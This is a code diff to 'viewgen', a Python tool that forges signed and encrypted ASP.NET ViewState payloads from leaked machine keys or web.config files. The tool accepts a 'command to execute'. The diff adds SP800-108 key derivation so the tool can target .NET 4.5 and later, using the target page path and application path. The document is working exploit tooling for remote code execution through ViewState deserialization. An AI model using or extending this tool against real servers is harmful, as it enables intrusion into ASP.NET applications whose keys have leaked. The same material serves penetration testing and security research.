@@ -5,6 +5,8 @@ from pprint import pprint
 from Crypto.Cipher import AES
 from Crypto.Cipher import DES
 from Crypto.Cipher import DES3
+from Crypto.Util.Padding import unpad
+from Crypto.Util.Padding import pad
 from viewstate import ViewState
 from xml.dom import minidom
 from colored import fg, attr
@@ -18,13 +20,10 @@ import binascii
 import struct
 import sys
 import urllib.parse
-
+import sp800_108
 
 VERSION = 0.3
 
-
-pad = lambda s, bs: s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode("ascii")
-unpad = lambda s: s[:-ord(s[len(s)-1:])]
 
 
 def success(s):
@@ -40,20 +39,32 @@ class ViewGen:
 	hash_algs = {"SHA1": hashlib.sha1, "MD5": hashlib.md5, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512, "AES": hashlib.sha1, "3DES": hashlib.sha1}
 	hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64, "AES": 20, "3DES": 20}
 
-	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False, viewstateuserkey=None):
+	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False, viewstateuserkey=None, path=None, apppath=None):
 		self.validation_key = validation_key
 		self.dec_key = dec_key
 		self._init_validation_alg(validation_alg)
 		self._init_dec_alg(dec_alg)
 		self.encrypted = encrypted
+		self.path = path
+		self.apppath = apppath
 		if modifier is None:
-			self.modifier = ViewGen.MD5_MODIFIER
+			if not apppath and not path:
+				self.modifier = ViewGen.MD5_MODIFIER
+			else:
+				self.encrypted = True
+				self.modifier = ""
+				self.purpose = sp800_108.Purpose("WebForms.HiddenFieldPageStatePersister.ClientState", ["TemplateSourceDirectory: " + simulate_template_source_directory(path, is_debug=False), "Type: " + simulate_get_type_name(path, apppath, is_debug=False)])
+				self.dec_key = sp800_108.SP800_108.derive_key(dec_key, self.purpose)
+				self.validation_key = sp800_108.SP800_108.derive_key(validation_key, self.purpose)
 		else:
 			self.modifier = struct.pack("<I", int(modifier, 16))
 		if viewstateuserkey:
 			self.viewstateuserkey = bytes(viewstateuserkey, "utf-16le")
 			self.modifier += self.viewstateuserkey
-		self.modifier_size = 4 + len(bytes(args.viewstateuserkey, "utf-16le")) if args.viewstateuserkey else 4
+		if not apppath and not path:
+			self.modifier_size = 4 + len(bytes(args.viewstateuserkey, "utf-16le")) if args.viewstateuserkey else 4
+		else:
+			self.modifier_size = 0
 		self._reuse_iv = False
 		self._iv = None
 		self._random_bytes = None
@@ -93,17 +104,26 @@ class ViewGen:
 				iv = self._gen_random_bytes(AES.block_size)
 				random_bytes = self._gen_random_bytes(len(self.dec_key) - AES.block_size)
 			cipher = AES.new(self.dec_key, AES.MODE_CBC, iv)
-			payload = pad(random_bytes + data + self.modifier, AES.block_size)
+			if not self.path and not self.apppath:
+				payload = pad(random_bytes + data + self.modifier, AES.block_size)
+			else:
+				payload = pad(data, AES.block_size)
 		elif self.dec_alg == "DES":
 			if not self._reuse_iv:
 				iv = self._gen_random_bytes(DES.block_size)
 			cipher = DES.new(self.dec_key[:8], DES.MODE_CBC, iv)
-			payload = pad(data + self.modifier, DES.block_size)
+			if not self.path and not self.apppath:
+				payload = pad(data + self.modifier, DES.block_size)
+			else:
+				payload = pad(data, DES.block_size)
 		elif self.dec_alg == "3DES":
 			if not self._reuse_iv:
 				iv = self._gen_random_bytes(DES3.block_size)
 			cipher = DES3.new(self.dec_key[:24], DES3.MODE_CBC, iv)
-			payload = pad(data + self.modifier, DES3.block_size)
+			if not self.path and not self.apppath:
+				payload = pad(data + self.modifier, DES3.block_size)
+			else:
+				payload = pad(data, DES3.block_size)
 		else:
 			return None
 
@@ -116,31 +136,38 @@ class ViewGen:
 			iv = data[0:AES.block_size]
 			enc = data[AES.block_size:-hash_size]
 			cipher = AES.new(self.dec_key, AES.MODE_CBC, iv)
-			random_bytes_size = len(self.dec_key) - AES.block_size
+			block_size = AES.block_size
+			random_bytes_size = 0
+			if not self.path and not self.apppath:
+				random_bytes_size = len(self.dec_key) - AES.block_size
 		elif self.dec_alg == "DES":
 			iv = data[0:DES.block_size]
 			enc = data[DES.block_size:-hash_size]
 			cipher = DES.new(self.dec_key[:8], DES.MODE_CBC, iv)
+			block_size = DES.block_size
 			random_bytes_size = 0
 		elif self.dec_alg == "3DES":
 			iv = data[0:DES3.block_size]
 			enc = data[DES3.block_size:-hash_size]
 			cipher = DES3.new(self.dec_key[:24], DES3.MODE_CBC, iv)
+			block_size = DES3.block_size
 			random_bytes_size = 0
 		else:
 			return None
 
 		dec = cipher.decrypt(enc)
 		signature = data[-hash_size:]
-		unpad_dec = unpad(dec)
+		unpad_dec = unpad(dec, block_size)
 		self._random_bytes = unpad_dec[:random_bytes_size]
 		self._iv = iv
 		modifier = unpad_dec[-self.modifier_size:]
 		idx = self.modifier_size
 		if self._double_signature:
 			idx += 20
-
-		return base64.b64encode(unpad_dec[random_bytes_size:-idx]), signature
+		if not self.path and not self.apppath:
+			return base64.b64encode(unpad_dec[random_bytes_size:-idx]), signature
+		else:
+			return base64.b64encode(unpad_dec), signature
 
 	def encrypt_and_sign(self, payload):
 		if self._double_signature:
@@ -249,7 +276,7 @@ def read_webconfig(webconfig_path):
 def parse_args():
 	parser = argparse.ArgumentParser(description="viewgen is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or web.config files")
 	parser.add_argument("--webconfig", help="automatically load keys and algorithms from a web.config file", required=False)
-	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
+	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default=None)
 	parser.add_argument("--viewstateuserkey", help="ViewStateUserKey value", required=False)
 	parser.add_argument("-c", "--command", help="command to execute", required=False)
 	parser.add_argument("--decode", help="decode a ViewState payload", required=False, default=False, action="store_true")
@@ -264,6 +291,8 @@ def parse_args():
 	parser.add_argument("payload", help="ViewState payload (base 64 encoded)", nargs="?")
 	parser.add_argument("-f", "--file", help="read ViewState payload from file", required=False)
 	parser.add_argument("--version", help="show viewgen version", required=False, action="store_true")
+	parser.add_argument("--path", help="target web page(only for .NET >= 4.5)", required=False)
+	parser.add_argument("--apppath", help="application path(only for .NET >= 4.5)", required=False)
 	args = parser.parse_args()
 
 	if len(sys.argv) == 1:
@@ -300,7 +329,7 @@ def run_viewgen(args):
 				warning("Please provide validation key and algorithm or a valid web.config")
 				exit(1)
 
-	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted, args.viewstateuserkey)
+	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted, args.viewstateuserkey, args.path, args.apppath)
 
 	if args.decode:
 		viewstate, signature = viewgen.decode(args.payload, parse=True)
@@ -357,6 +386,68 @@ def run_viewgen(args):
 		else:
 			result = str(result, "utf-8")
 		print(result)
+
+
+def simulate_template_source_directory(str_path: str, is_debug: bool = False) -> str:
+	if not str_path.startswith("/"):
+		str_path = "/" + str_path
+
+	result = str_path
+
+	if result.rfind(".") > result.rfind("/"):
+		result = result[:result.rfind("/") + 1]
+
+	result = remove_slash_from_path_if_needed(result)
+
+	if is_debug:
+		print(f"simulateTemplateSourceDirectory returns: {result}")
+
+	return result
+
+
+def simulate_get_type_name(str_path: str, IIS_app_in_path: str, is_debug: bool = False) -> str:
+	if not str_path.startswith("/"):
+		str_path = "/" + str_path
+
+	result = str_path
+
+	if not result.lower().endswith(".aspx"):
+		result += "/default.aspx"
+
+	IIS_app_in_path = IIS_app_in_path.lower()
+
+	if not IIS_app_in_path.startswith("/"):
+		IIS_app_in_path = "/" + IIS_app_in_path
+
+	if not IIS_app_in_path.endswith("/"):
+		IIS_app_in_path += "/"
+
+	if IIS_app_in_path in result.lower():
+		result = result[result.lower().index(IIS_app_in_path) + len(IIS_app_in_path):]
+
+	if result.startswith("/"):
+		result = result[1:]
+
+	result = result.replace(".", "_").replace("/", "_")
+
+	result = remove_slash_from_path_if_needed(result)
+
+	if is_debug:
+		print(f"simulateGetTypeName returns: {result}")
+
+	return result.upper()
+
+
+def remove_slash_from_path_if_needed(path: str) -> str:
+	if not path:
+		return None
+
+	length = len(path)
+
+	if length <= 1 or path[-1] != '/':
+		return path
+
+	return path[:-1]
 
 
 if __name__ == "__main__":
